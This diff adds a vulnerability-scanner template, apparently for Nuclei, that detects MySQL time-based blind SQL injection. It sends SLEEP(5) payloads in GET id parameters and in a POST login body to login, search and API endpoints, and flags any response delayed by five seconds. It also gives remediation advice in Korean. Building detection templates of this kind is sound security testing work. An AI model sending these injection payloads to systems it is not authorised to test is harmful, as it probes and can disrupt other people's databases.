@@ -1,0 +1,47 @@
+id: sqli-time-based-blind-mysql
+
+info:
+  name: MySQL Time-Based Blind SQL Injection
+  author: security-researcher
+  severity: high
+  description: |
+    MySQL SLEEP() 함수를 이용한 시간 기반 블라인드 SQL 인젝션을 탐지합니다.
+    응답 지연 시간을 측정하여 취약점 여부를 판단합니다.
+  tags: sqli,blind,time-based,mysql,injection
+  remediation: |
+    - Prepared Statement 사용
+    - 쿼리 실행 타임아웃 설정
+    - 데이터베이스 사용자 권한 최소화
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}?id=1 AND SLEEP(5)--"
+      - "{{BaseURL}}?id=1' AND SLEEP(5)--"
+      - "{{BaseURL}}?id=1\" AND SLEEP(5)--"
+      - "{{BaseURL}}?id=1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
+      - "{{BaseURL}}?id=1' AND (SELECT SLEEP(5))--"
+      - "{{BaseURL}}?id=1;SELECT SLEEP(5)--"
+      - "{{BaseURL}}?id=1 OR SLEEP(5)--"
+      - "{{BaseURL}}?id=1' OR SLEEP(5)='0"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration >= 5000"
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/login"
+      - "{{BaseURL}}/search"
+      - "{{BaseURL}}/api/query"
+
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+
+    body: "username=admin' AND SLEEP(5)--&password=test"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration >= 5000"
